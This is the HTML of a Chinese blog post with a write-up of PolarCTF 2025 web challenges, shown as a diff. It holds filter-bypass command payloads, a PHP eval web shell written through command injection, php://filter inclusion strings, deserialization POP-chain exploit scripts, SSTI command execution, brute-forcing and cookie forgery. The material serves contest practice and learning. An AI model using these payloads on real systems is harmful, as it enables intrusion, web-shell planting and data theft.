@@ -1,0 +1,504 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ez_checkjava题暂时不会 狗黑子的变量考点:截取和拼接$PATH中的字符构造命令 构造方法: 12$PATH:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin$PATJl&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin  构造ls这个命令的结果">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2025年夏季个人挑战赛PolarCTF-WEB">
+<meta property="og:url" content="http://example.com/2025/06/29/2025%E5%B9%B4%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9BPolarCTF-WEB/index.html">
+<meta property="og:site_name" content="Sauy&#39;s corner">
+<meta property="og:description" content="ez_checkjava题暂时不会 狗黑子的变量考点:截取和拼接$PATH中的字符构造命令 构造方法: 12$PATH:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin$PATJl&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin  构造ls这个命令的结果">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/image-20250628211338078.png">
+<meta property="og:image" content="http://example.com/images/image-20250628212358616.png">
+<meta property="og:image" content="http://example.com/images/image-20250628213921480.png">
+<meta property="og:image" content="http://example.com/images/image-20250629103626404.png">
+<meta property="og:image" content="http://example.com/images/image-20250629104228184.png">
+<meta property="og:image" content="http://example.com/images/image-20250629104209263.png">
+<meta property="og:image" content="http://example.com/images/image-20250629104323974.png">
+<meta property="og:image" content="http://example.com/images/image-20250629133659277.png">
+<meta property="og:image" content="http://example.com/images/image-20250629143312586.png">
+<meta property="og:image" content="http://example.com/images/image-20250629143858180.png">
+<meta property="og:image" content="http://example.com/images/image-20250629152942120.png">
+<meta property="og:image" content="http://example.com/images/image-20250629163439476.png">
+<meta property="og:image" content="http://example.com/images/image-20250629171713533.png">
+<meta property="og:image" content="http://example.com/images/image-20250629171750702.png">
+<meta property="og:image" content="http://example.com/images/image-20250629172110963.png">
+<meta property="og:image" content="http://example.com/images/image-20250629172143965.png">
+<meta property="og:image" content="http://example.com/images/image-20250629171518524.png">
+<meta property="article:published_time" content="2025-06-29T09:24:58.000Z">
+<meta property="article:modified_time" content="2025-06-29T09:31:31.914Z">
+<meta property="article:author" content="Sauy">
+<meta property="article:tag" content="CTF-wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20250628211338078.png">
+
+<link rel="canonical" href="http://example.com/2025/06/29/2025%E5%B9%B4%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9BPolarCTF-WEB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>2025年夏季个人挑战赛PolarCTF-WEB | Sauy's corner</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sauy's corner</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/06/29/2025%E5%B9%B4%E5%A4%8F%E5%AD%A3%E4%B8%AA%E4%BA%BA%E6%8C%91%E6%88%98%E8%B5%9BPolarCTF-WEB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/2.png">
+      <meta itemprop="name" content="Sauy">
+      <meta itemprop="description" content="VENI,VEDI,VICI">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sauy's corner">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          2025年夏季个人挑战赛PolarCTF-WEB
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-06-29 17:24:58 / 修改时间：17:31:31" itemprop="dateCreated datePublished" datetime="2025-06-29T17:24:58+08:00">2025-06-29</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="ez-check"><a href="#ez-check" class="headerlink" title="ez_check"></a>ez_check</h2><p>java题暂时不会</p>
+<h2 id="狗黑子的变量"><a href="#狗黑子的变量" class="headerlink" title="狗黑子的变量"></a>狗黑子的变量</h2><p>考点:截取和拼接$PATH中的字符构造命令</p>
+<p>构造方法:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">$PATJl/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br></pre></td></tr></table></figure>
+
+<p>构造ls这个命令的结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PATH:5:1&#125; //l</span><br><span class="line">$&#123;PATH:2:1&#125; //s</span><br><span class="line">$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //ls</span><br><span class="line">//第一个字母代表PATH里的第几个字符，从0开始，和数组一样 第二个是代表截取几个字符</span><br></pre></td></tr></table></figure>
+
+<p>dirsearch扫描 扫出admin.php 可以看到PATH的内容</p>
+<p><img src="/images/image-20250628211338078.png" alt="image-20250628211338078"></p>
+<p>于是乎就开始拼接要被替换的字母</p>
+<p><code>$&#123;PATH:8;1&#125;at /*  </code> cat &#x2F;*</p>
+<h2 id="狗黑子的隐藏"><a href="#狗黑子的隐藏" class="headerlink" title="狗黑子的隐藏"></a>狗黑子的隐藏</h2><p>进去只有一个刷新按钮 dirsearch也没有看出东西 F12习惯 看到cmd参数 执行命令 成功</p>
+<p>禁了&#x2F; env看看 直接出假flag！！！！！！！！<img src="/images/image-20250628212358616.png" alt="image-20250628212358616"></p>
+<p>ctrl+u得到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="number">1</span>	<span class="meta">&lt;?php</span></span><br><span class="line"> <span class="number">2</span>	<span class="comment">// 检查是否有POST请求且包含cmd参数</span></span><br><span class="line"> <span class="number">3</span>	<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line"> <span class="number">4</span>	    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"> <span class="number">5</span>	    </span><br><span class="line"> <span class="number">6</span>	    <span class="comment">// 强制切换到当前目录（重要安全措施）</span></span><br><span class="line"> <span class="number">7</span>	    <span class="title function_ invoke__">chdir</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"> <span class="number">8</span>	    </span><br><span class="line"> <span class="number">9</span>	    <span class="comment">// 过滤危险字符和关键字</span></span><br><span class="line"><span class="number">10</span>	    <span class="variable">$blacklist</span> = <span class="keyword">array</span>(<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;in&#x27;</span>,<span class="string">&#x27;nd&#x27;</span>,<span class="string">&#x27;de&#x27;</span>,<span class="string">&#x27;ex&#x27;</span>,<span class="string">&#x27;head&#x27;</span>,<span class="string">&#x27;tac&#x27;</span>,<span class="string">&#x27;le&#x27;</span>,<span class="string">&#x27;ss&#x27;</span>,<span class="string">&#x27;mo&#x27;</span>,<span class="string">&#x27;re&#x27;</span>,<span class="string">&#x27;..&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line"><span class="number">11</span>	    <span class="variable">$is_dangerous</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="number">12</span>	    </span><br><span class="line"><span class="number">13</span>	    <span class="comment">// 检查命令是否包含黑名单中的任何项</span></span><br><span class="line"><span class="number">14</span>	    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="number">15</span>	        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$cmd</span>, <span class="variable">$item</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line"><span class="number">16</span>	            <span class="variable">$is_dangerous</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="number">17</span>	            <span class="keyword">break</span>;</span><br><span class="line"><span class="number">18</span>	        &#125;</span><br><span class="line"><span class="number">19</span>	    &#125;</span><br><span class="line"><span class="number">20</span>	    </span><br><span class="line"><span class="number">21</span>	    <span class="comment">// 如果检测到危险操作，回显错误信息</span></span><br><span class="line"><span class="number">22</span>	    <span class="keyword">if</span> (<span class="variable">$is_dangerous</span>) &#123;</span><br><span class="line"><span class="number">23</span>	        <span class="keyword">echo</span> <span class="string">&quot;不支持危险操作&quot;</span>;</span><br><span class="line"><span class="number">24</span>	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">25</span>	        <span class="comment">// 检查过滤后的命令是否为空</span></span><br><span class="line"><span class="number">26</span>	        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$cmd</span>)) &#123;</span><br><span class="line"><span class="number">27</span>	            <span class="comment">// 执行过滤后的命令</span></span><br><span class="line"><span class="number">28</span>	            <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="number">29</span>	        &#125;</span><br><span class="line"><span class="number">30</span>	    &#125;</span><br><span class="line"><span class="number">31</span>	&#125;</span><br><span class="line"><span class="number">32</span>	?</span><br></pre></td></tr></table></figure>
+
+<p>直接写木马吧 <code>cmd=echo &#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39; &gt; a.php</code></p>
+<p>antsword连接成功 执行命令即可</p>
+<p><img src="/images/image-20250628213921480.png" alt="image-20250628213921480"></p>
+<h2 id="简单的链子"><a href="#简单的链子" class="headerlink" title="简单的链子"></a>简单的链子</h2><p>好简单的菜鸟反序列化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $cmd = &#x27;cat /flag&#x27;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        if (isset($this-&gt;cmd)) &#123;</span><br><span class="line">            system($this-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new A();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="渗透之王"><a href="#渗透之王" class="headerlink" title="渗透之王"></a>渗透之王</h2><p>首先进去是登录界面 帐号admin 随便猜了一个弱口令 提示密码错误 自己拿字典去爆也没爆出来</p>
+<p>于是dirsearch扫了一下目录 得到有用的两个路径</p>
+<p><img src="/images/image-20250629103626404.png" alt="image-20250629103626404"></p>
+<p>访问admin.php得到base64加密的密文 解密后为polarctf</p>
+<p><a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a> 下载下来发现需要密码 于是输入polarctf 成功解密 打开发现是个弱密码字典 于是我们就使用他的字典 爆出来密码是admin789 成功登录 进入界面点击发现提示非法的文件包含 那就是文件包含</p>
+<p><code>/polarctf/?page=php://filter/convert.base64-encode/resource=about.php</code></p>
+<p><code>/polarctf/?page=php://filter/convert.base64-encode/resource=hint.php</code></p>
+<p>提示有文件上传界面 现在就是找文件上传入口 这里你可以dirsearch扫 扫出来文件上传路径</p>
+<p><img src="/images/image-20250629104228184.png" alt="image-20250629104228184"></p>
+<p><img src="/images/image-20250629104209263.png" alt="image-20250629104209263"></p>
+<p>很简单的文件上传 改一下content-type即可</p>
+<p><img src="/images/image-20250629104323974.png" alt="image-20250629104323974"></p>
+<p>antsword连接即可</p>
+<h2 id="真假ECR"><a href="#真假ECR" class="headerlink" title="真假ECR"></a>真假ECR</h2><p>非预期:</p>
+<p>进去就是源代码 禁了一些指令 但是你可以使用转义绕过</p>
+<p><code>?cmd=ca\t /fla\g</code></p>
+<p>预期:</p>
+<p>先访问flag.php</p>
+<p>得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA= 如果这也不明白的话，加上后缀试一试</span><br></pre></td></tr></table></figure>
+
+<p>第一个解码后得到heigouzi 带上后缀php可以访问</p>
+<p><img src="/images/image-20250629133659277.png" alt="image-20250629133659277"></p>
+<p>参数应该也是cmd 执行命令ls 发现能够读取到这个网站的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cainiao.txt</span><br><span class="line">flag.php</span><br><span class="line">heigouzi.php</span><br><span class="line">index.php</span><br><span class="line">she11.php</span><br></pre></td></tr></table></figure>
+
+<p>查看cainiao.txt</p>
+<p>是个解密函数 用就好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据:</span><br><span class="line">KeY=aGVpZ291emk= USERID=p8Sjk58 DATA=2JSklNA=</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Decryption &#123; </span><br><span class="line">    public function decrypt($data, $key) &#123; </span><br><span class="line">        $char = &#x27;&#x27;; $str = &#x27;&#x27;;</span><br><span class="line">        $key = md5($key); $x = 0;</span><br><span class="line">        $data = base64_decode($data);</span><br><span class="line">        $len = strlen($data);</span><br><span class="line">        $l = strlen($key);</span><br><span class="line">        for ($i = 0; $i &lt; $len; $i++) &#123; </span><br><span class="line">            if ($x == $l) &#123; </span><br><span class="line">                $x = 0; </span><br><span class="line">            &#125; </span><br><span class="line">            $char.= substr($key, $x, 1);</span><br><span class="line">            $x++; &#125; </span><br><span class="line">        for ($i = 0; $i &lt; $len; $i++) &#123; </span><br><span class="line">            $str.= chr(ord($data[$i]) - ord($char[$i])); </span><br><span class="line">        &#125; return $str; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line">$data = &#x27;2JSklNA=&#x27;;</span><br><span class="line">$key = &#x27;answer&#x27;; </span><br><span class="line">$decryption = new Decryption();</span><br><span class="line">$result = $decryption-&gt;decrypt($data, $key);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>解密出来是wanan 是she11.php的密码 antsword连接即可</p>
+<h2 id="nukaka-ser2"><a href="#nukaka-ser2" class="headerlink" title="nukaka_ser2"></a>nukaka_ser2</h2><p>没什么好说的 反序列化审链子</p>
+<p>看起来很长 其实一下就做出了</p>
+<p>pop链子如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlagReader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$logfile</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataValidator</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FakeDanger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VulnerableClass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$debugMode</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title class_">VulnerableClass</span>();</span><br><span class="line"><span class="variable">$A</span> -&gt; logger = <span class="keyword">new</span> <span class="title class_">FlagReader</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="ghost-render"><a href="#ghost-render" class="headerlink" title="ghost_render"></a>ghost_render</h2><p>说是md渲染 抓包自己burp尝试 渲染我就想到ssti 测了下还真是</p>
+<p><img src="/images/image-20250629143312586.png" alt="image-20250629143312586"></p>
+<p>非常简单的ssti 没有过滤 直接执行命令即可 不过flag路径得首先去读取app.py才可以知道flag存储在&#x2F;var&#x2F;secret_flag下</p>
+<p><img src="/images/image-20250629143858180.png" alt="image-20250629143858180"></p>
+<h2 id="rce命令执行系统"><a href="#rce命令执行系统" class="headerlink" title="rce命令执行系统"></a>rce命令执行系统</h2><p>ls被过滤 试试转义</p>
+<p><img src="/images/image-20250629152942120.png" alt="image-20250629152942120"></p>
+<p>访问发f1ag.php得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">既然你找到这里了那就告诉你点东西吧 异或后它好像改名叫XOR_KEY，给他传个参试一试呢，对了，咱们的靶场叫什么来着？🤔</span><br></pre></td></tr></table></figure>
+
+<p>payload env XOR_KEY&#x3D;Polar</p>
+<h2 id="easyRead"><a href="#easyRead" class="headerlink" title="easyRead"></a>easyRead</h2><p>嗯很简单的链子 但是拿flag很神经 flag我执行命令没找到 这道题flag是flag{Hello&gt;&gt;&gt;Hello&gt;&gt;&gt;run}</p>
+<p>exp</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Class Read&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Help</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Polar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span> = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Doit</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$is</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Read</span>(); <span class="variable">$a1</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; source = <span class="variable">$a1</span>;</span><br><span class="line"><span class="variable">$a1</span> -&gt; is = <span class="keyword">new</span> <span class="title class_">Help</span>();</span><br><span class="line"><span class="variable">$a1</span> -&gt; is -&gt; str = <span class="keyword">new</span> <span class="title class_">Doit</span>();</span><br><span class="line"><span class="variable">$a1</span> -&gt; is -&gt; str -&gt; is = <span class="keyword">new</span> <span class="title class_">Polar</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="命运石之门"><a href="#命运石之门" class="headerlink" title="命运石之门"></a>命运石之门</h2><p>进去就是验证密码 ctrl+u发现提示 <code>5pyJ5pe25YCZ77yM6aqM6K+B56CB5piv5ZCm5aW95L2/5LiN6YeN6KaB</code></p>
+<p><img src="/images/image-20250629163439476.png" alt="image-20250629163439476"></p>
+<p>然后dirsearch扫描发现 passwrod.txt 直接burp开爆 验证码说是不重要 随便填 结果还是要猜万能验证码0000 直接进第二步</p>
+<p>还是爆密码 字典是拿到的password.txt内容 爆出来密码是 huan9le1Sam0</p>
+<p>直接过人机验证即可得到flag</p>
+<h2 id="你也玩铲吗"><a href="#你也玩铲吗" class="headerlink" title="你也玩铲吗"></a>你也玩铲吗</h2><p>首先先注册 登陆进去看到ctrl+u看到提示</p>
+<p><img src="/images/image-20250629171713533.png" alt="image-20250629171713533"></p>
+<p>dirsearch扫描 扫描出来好几个敏感路径</p>
+<p><img src="/images/image-20250629171750702.png" alt="image-20250629171750702"></p>
+<p>访问&#x2F;login_admin.html 看到管理员登录界面 结合提示 伪造cookie</p>
+<p><img src="/images/image-20250629172110963.png" alt="image-20250629172110963"></p>
+<p>修改cookie如下图</p>
+<p><img src="/images/image-20250629172143965.png" alt="image-20250629172143965"></p>
+<p>再去访问admin_login.php</p>
+<p><img src="/images/image-20250629171518524.png" alt="image-20250629171518524"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF-wp/" rel="tag"># CTF-wp</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/06/09/BUU-%E5%88%B7%E9%A2%98/" rel="prev" title="web刷题——持续更新">
+      <i class="fa fa-chevron-left"></i> web刷题——持续更新
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
